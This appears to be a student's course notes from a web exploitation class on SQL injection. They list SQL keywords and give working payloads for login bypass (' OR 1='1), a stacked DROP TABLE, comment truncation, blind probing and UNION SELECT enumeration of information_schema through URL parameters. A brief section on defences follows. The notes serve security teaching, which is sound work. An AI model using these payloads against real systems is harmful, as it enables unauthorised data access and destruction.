# SECURITY:


## WEB EXPLOITATION DAY 2 - SQL INJECTION: 
```
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/05-sql-injection-slides.html
```
```
SELECT: Extracts data from a database

UNION: Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS

USE: Selects the DB to use

UPDATE: Updates data in a database

DELETE: Deletes data from a database

INSERT INTO: Inserts new data into a database

CREATE DATABASE: Creates a new database

ALTER DATABASE: Modifies a database

CREATE TABLE: Creates a new table

ALTER TABLE: Modifies a table

DROP TABLE: Deletes a table

CREATE INDEX: Creates an index (search key)

DROP INDEX: Deletes an index
```

SQL injection: 
```
Input fields can be found using a Single Quote --> '
Will return extraneous information

' closes a variable, to allow for additional statements/clauses

May show no errors or generic error (harder Injection)
Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
Server-Side Query Processing
User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
The Server-Side Query that would be passed to MySQL from PHP would be:

BEFORE INPUT:
SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
AFTER INPUT:
SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields.


Truth Statement: tom ' OR 1='1


Server-Side query executed would appear like this:


SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
```
## Stacking Statements:
```
Chaining multiple statements together using a semi-colon ;
SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
```
## Nesting statements
```
Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
Though they may allow for nesting a statement within an existing one:
php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
```
## Ignore the rest
```
Using # or -- tells the Database to ignore everything after

Server-Side Query:
SELECT product FROM item WHERE id = $select limit 1;

Input to Inject:
1 OR 1=1; #

Server-Side Query becomes:
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
```
Blind Injection
```
Inlcudes Statements to determine how DB is configured

Columns in Output

Can we return errors

Can we return expected Output

Used when unsanitized fields give generic error or no messages



Normal Query to pull expected output:

php?item=4



Blind injection for validation:

php?item=4 OR 1=1



Try ALL combinations! ITEM=1, ITEM=2, ITEM=3, ETC.
```
Abuse The Client (GET METHOD):
```
Passing injection through the URL:

After the .PHP?ITEM=4 pass your UNION statement



prices.php?item=4 UNION SELECT 1,2



prices.php?item=4 UNION SELECT 1,2,@@version



What is @@VERSION?
```
Abuse The Client (Enum):
```
Identifying the schema leads to detailed queries to enumerate the DB



Research Database Schemas and what information they provide



php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()


What are INFORMATION_SCHEMA and DATABASE()?
```
```
SQL Injection (Database Enumeration):
DEMO: SQL Injection (Database Enumeration)
http://10.50.XX.XX/Union.html
Abuse The Client (Enum)
Identifying the schema leads to detailed queries to enumerate the DB

Defending Against
Validate inputs! Methods differ depending on software
CONCATENATE : turns inputs into single strings or escape characters
PHP: MYSQL_REAL_ESCAPE_STRING
SQL: SQLITE3_PREPARE()
```




